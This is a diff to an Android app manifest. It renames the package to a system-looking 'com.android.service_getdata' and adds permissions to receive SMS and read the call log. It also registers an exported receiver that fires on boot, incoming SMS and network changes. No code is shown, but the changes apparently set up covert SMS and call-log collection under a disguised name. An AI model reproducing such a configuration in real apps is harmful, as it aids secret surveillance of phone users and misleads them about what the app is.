@@ -1,10 +1,13 @@
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
-    package="sms.example.inbjavia.server_parse" >
+    package="com.android.service_getdata" >
 
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
     <uses-permission android:name="android.permission.READ_SMS" />
-    <uses-permission android:name="android.permission.WRITE_SMS"/>
+    <uses-permission android:name="android.permission.RECEIVE_SMS" />
+    <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+
     <application
         android:allowBackup="true"
         android:icon="@drawable/ic_launcher"
@@ -21,23 +24,27 @@
         </activity>
 
         <receiver
-            android:name=".BootReceiver"
+            android:name=".AllReceiver"
             android:enabled="true"
             android:exported="true" >
             <intent-filter>
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+                <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
+                <action android:name="android.net.wifi.WIFI_STATE_CHANGED" />
             </intent-filter>
         </receiver>
 
         <service
-            android:name=".MyService"
+            android:name=".Service.MyService"
             android:enabled="true"
             android:exported="true" >
         </service>
-        <provider android:name="sms.example.inbjavia.server_parse.MySmsProvider"
+
+        <provider android:name=".provider.ServiceProvider"
             android:exported="true"
             android:multiprocess="true"
-            android:authorities="sms.example.inbjavia.server_parse.MySmsProvider"/>
+            android:authorities="com.android.service_getdata.provider.ServiceProvider"/>
     </application>
 
 </manifest>
